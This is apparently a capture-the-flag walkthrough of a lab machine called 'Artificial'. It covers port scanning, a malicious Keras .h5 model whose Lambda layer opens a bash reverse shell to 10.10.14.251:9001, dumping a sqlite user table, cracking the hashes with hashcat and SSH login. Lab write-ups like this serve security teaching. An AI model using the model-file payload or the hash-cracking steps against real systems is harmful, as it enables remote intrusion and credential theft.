Firstly, we start with enumeration of the 1000 ports:
```sh
sudo nmap -sV -sC -oA artificial 10.10.11.74
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-02 09:09 EST
Nmap scan report for 10.10.11.74
Host is up (0.051s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://artificial.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.65 seconds
```

A VERY important thing, that I spent a lot of hours into, is the fact that I couldn't connect to the website at port 80. This is because, at port 80 we get redirected to `artificial.htb`. That means that the webserver expects the Host header to be `artificial.htb`.

So to fix this we write `10.10.11.74 artificial.htb` to `/etc/hosts`
```sh
sudo nano etc/hosts
```

Once we fix this, we enter the website:

![](../attachments/Pasted%20image%2020251102170444.png)

I checked the source code of the website but there was nothing there. Also I ran `gobuster` but I also found nothing, so I went to register to make an account:

![](../attachments/Pasted%20image%2020251102171640.png)

And then I logged in:

![](../attachments/Pasted%20image%2020251102171726.png)

I, then, clicked on the `requirements` and the `Dockerfile` which downloaded a `requirements.txt` and a `Dockerfile` respectively.

![](../attachments/Pasted%20image%2020251102213911.png)

Also, when I click on the `Browse` button to upload a model it searches for .h5 file.

![](../attachments/Pasted%20image%2020251102214048.png)

So I have to upload a malicious model, and the reason that they included the `Dockerfile` is to ensure that the payload is using `python 3.8` or else the payload may not work.

So first I have to build this Docker file:
```sh
sudo docker build . -t artificial
root@b1acd049a477:/code# ls
tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl
```

and after it is built we will run this container with an interactive terminal:
```sh
sudo docker run -it -v $(pwd):/mnt artificial
```

So now we need to create a python payload in the directory `/mnt`. When searching the Internet for a tenserflow malicious code RCE I found this github repo: https://github.com/Splinter0/tensorflow-rce

![](../attachments/Pasted%20image%2020251102220417.png)


And if we go to the `exploit.py` we will find a python payload, but we are going to change it a little bit (specifically the `os.system()`) and we get this code:

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.251/9001 0>&1'")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

and then we write this code in the Download:
```sh
sudo nano exploit.py
```

Inside the container that we created we run the python script:
```python
python3 exploit.py
```

![](../attachments/Pasted%20image%2020251102221356.png)

and we get the `exploit.h5` model. So in the kali linux machine we starting to listen on port 9001:
```sh
nc -lvnp 9001
```

Then we upload the exploit.h5 on the website:
![](../attachments/Pasted%20image%2020251102221757.png)

and we get a shell:

![](../attachments/Pasted%20image%2020251102221853.png)

When we enter a web application it is good to go for the database, so we type:
```sh
find . -type f
```

![](../attachments/Pasted%20image%2020251102222246.png)

and we see that we find a `users.db`

First we type this to enumerate the database:
```sh
cd instance
app@artificial:~/app/instance$ sqlite3 users.db '.tables'
sqlite3 users.db '.tables'
model  user 
```

![](../attachments/Pasted%20image%2020251102223600.png)

and then:
```sh
sqlite3 users.db 'select * from user;'
```

![](../attachments/Pasted%20image%2020251102223705.png)

We copy paste the password hashes of users in the web application in the local machine in a file called `hashes`
We are gonna try to crack them with `hashcat`

```sh
hashcat -m 0 hashes /usr/share/wordlists/rockyou.txt
```

and after it finished we got the passwords:

![](../attachments/Pasted%20image%2020251102224912.png)

The previous to the last password belongs to the user `gael` so we are gonna to log in to the target as `gael` via SSH:

```sh
ssh gael@artificial.htb
```

![](../attachments/Pasted%20image%2020251102225401.png)

